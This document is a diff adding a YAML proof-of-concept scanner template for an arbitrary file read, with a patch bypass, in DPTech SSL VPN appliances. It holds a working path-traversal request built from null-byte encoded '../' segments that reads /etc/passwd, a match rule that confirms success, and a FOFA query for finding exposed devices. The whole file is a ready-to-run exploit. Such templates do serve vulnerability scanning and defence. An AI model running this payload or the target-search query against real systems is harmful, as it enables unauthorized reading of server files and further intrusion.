@@ -1,0 +1,15 @@
+id: poc-yaml-dptech-ssl-vpn-anyfile-read-patch-bypass
+info:
+  name: 迪普 DPTech-VPN 任意文件读取漏洞(补丁绕过)
+  severity: high
+  tags:
+  - 文件读取
+  finger: DPtech SSL VPN
+  fofa: body="/SystemManage/BaseProject" || title=="基础信息平台"
+requests:
+- method: GET
+  path: /.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2Fetc%2Fpasswd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && !contains(body,"<") && contains(headers,"Dptech server")
+variables: {}
+transport: http
